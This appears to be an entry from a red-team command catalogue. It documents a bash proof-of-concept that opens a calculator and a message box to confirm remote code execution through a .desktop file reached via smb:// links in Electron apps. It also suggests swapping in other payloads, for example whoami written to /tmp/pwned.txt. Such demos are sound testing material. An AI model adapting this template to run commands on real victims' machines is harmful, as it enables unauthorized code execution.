---
id: cmd-bash-rce-demo
data: bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
tags:
  - rce
  - demo
type: command
output: >-
  Calculator application opens and a message box appears saying 'Hello from
  Electron.'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:28.536Z'
verified: false
validated: true
submitted: true
---
# bash-rce-demo

## Command

```bash
bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
```

## Description

This bash command demonstrates remote code execution by launching the MATE calculator in the background and displaying a message dialog, embedded in a .desktop file for exploitation via smb:// in Electron apps.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c` | Executes the following string as a command | Yes |
| `(mate-calc &)` | Background launch of calculator | Yes |
| `xmessage "Hello from Electron."` | Displays dialog with custom text | Yes |

## Examples

### Basic Usage

```bash
bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
```

### Advanced Usage

Adapt for other payloads, e.g., replace with `whoami` for identity check:

```bash
bash -c "whoami > /tmp/pwned.txt; xmessage \"RCE Success\""
```

## Expected Output

Calculator application opens silently in the background, and a simple X11 message dialog pops up displaying 'Hello from Electron.' This confirms arbitrary command execution on the victim's desktop environment.

## Related

- [[Related Procedure: Trigger-and-Verify-RCE-via-Link-Click]]
